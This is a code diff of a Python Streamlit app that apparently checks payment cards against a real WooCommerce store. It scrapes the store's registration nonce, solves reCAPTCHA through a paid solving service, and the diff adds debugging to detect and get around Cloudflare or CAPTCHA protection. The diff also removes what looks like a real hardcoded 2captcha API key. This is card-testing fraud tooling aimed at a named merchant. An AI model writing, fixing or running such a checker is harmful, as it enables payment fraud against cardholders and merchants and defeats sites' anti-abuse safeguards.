@@ -1,28 +1,22 @@
 import os
 import streamlit as st
+import re
+import base64
+import random
+import string
+import requests
+import time
+import json
+
+# Install required packages if not already installed
 try:
-    import pyfiglet, webbrowser, user_agent, time
-    import requests
-    import re
-    import base64
-    import random
-    import string
-    
-except ImportError as e:
-    print("An error occurred in installing library:", e)
-    print("Libraries are installed.")
+    import pyfiglet
+    import user_agent
+except ImportError:
+    st.warning("Installing required libraries...")
     os.system('pip install pyfiglet user_agent requests')
     import pyfiglet
-    import webbrowser
     import user_agent
-    import time
-    import requests
-    import re
-    import base64
-    import random
-    import string
-    import requests
-
 
 # Function to get reCAPTCHA token
 def get_recaptcha_token(site_key, page_url):
@@ -32,7 +26,7 @@ def get_recaptcha_token(site_key, page_url):
     # Uncomment and add your API key if you use 2captcha
     """
     try:
-        api_key = "9f21f1ce48c5ab80f2f9b423fefb1682"  # Replace with your actual 2captcha API key
+        api_key = "YOUR_2CAPTCHA_API_KEY"  # Replace with your actual 2captcha API key
         data = {
             'key': api_key,
             'method': 'userrecaptcha',
@@ -192,10 +186,36 @@ def Tele(ccx, recaptcha_token=None):
     with st.spinner("Checking card... register phase"):
         response = r.get('https://www.yazoomills.com/my-account', headers=headers)
         
+        # Debug HTML response
+        html_snippet = response.text[:2000] + "..." if len(response.text) > 2000 else response.text
+        st.write(f"Response status code: {response.status_code}")
+        st.write("First 2000 characters of HTML response:")
+        st.code(html_snippet, language="html")
+        
+        # Check if the site might be blocking access
+        if "captcha" in response.text.lower() or "cloudflare" in response.text.lower():
+            st.warning("Possible protection detected (Cloudflare or CAPTCHA)")
+        
+        # Try to extract nonce with more detailed error handling
         try:
-            register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-        except:
-            return "Error: Could not extract register nonce"
+            register_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
+            if register_nonce_match:
+                register_nonce = register_nonce_match.group(1)
+                st.success(f"Successfully extracted register nonce: {register_nonce}")
+            else:
+                # Try a more general search to see what's available
+                form_fields = re.findall(r'name="([^"]+)"', response.text)
+                st.write("Found form fields in the response:", form_fields)
+                
+                # Look for any nonce-like field
+                nonce_fields = [field for field in form_fields if "nonce" in field.lower()]
+                if nonce_fields:
+                    st.write("Possible nonce fields found:", nonce_fields)
+                
+                return "Error: Could not extract register nonce - pattern not found in response"
+        except Exception as e:
+            st.error(f"Exception during register nonce extraction: {str(e)}")
+            return f"Error: Could not extract register nonce - {str(e)}"
     
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
